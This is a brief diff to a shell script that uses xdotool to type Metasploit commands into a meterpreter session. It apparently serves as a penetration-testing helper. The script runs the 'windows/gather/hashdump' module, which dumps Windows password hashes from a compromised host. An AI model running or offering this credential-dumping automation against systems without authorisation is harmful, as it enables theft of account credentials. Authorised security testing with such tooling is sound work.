@@ -4,19 +4,15 @@
 meterpreter: set windows post hash dump
 '
 
-source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
-source ~/Desktop/base/code/xdotool/helpers/find_and_replace_in_file.sh
+# Generate GUI form items (label, type (optional: default text), name, default (optional))
+SESSION_FIELD=$(form_item  "SESSION" "number" "SESSION" "-1")
 
-# Generate gui form
-generate_form "SESSION"
+# Generate GUI form
+generate_form "${SESSION_FIELD}" 
 
 SESSION=${form_data["SESSION"]}
 
 paste_command "use windows/gather/hashdump"
-xdotool key Return
-sleep 0.8
-
-paste_command "sessions"
 xdotool key Return
 sleep 0.8
 
@@ -26,4 +22,3 @@ sleep 0.8
 
 paste_command "exploit"
 xdotool key Return
-
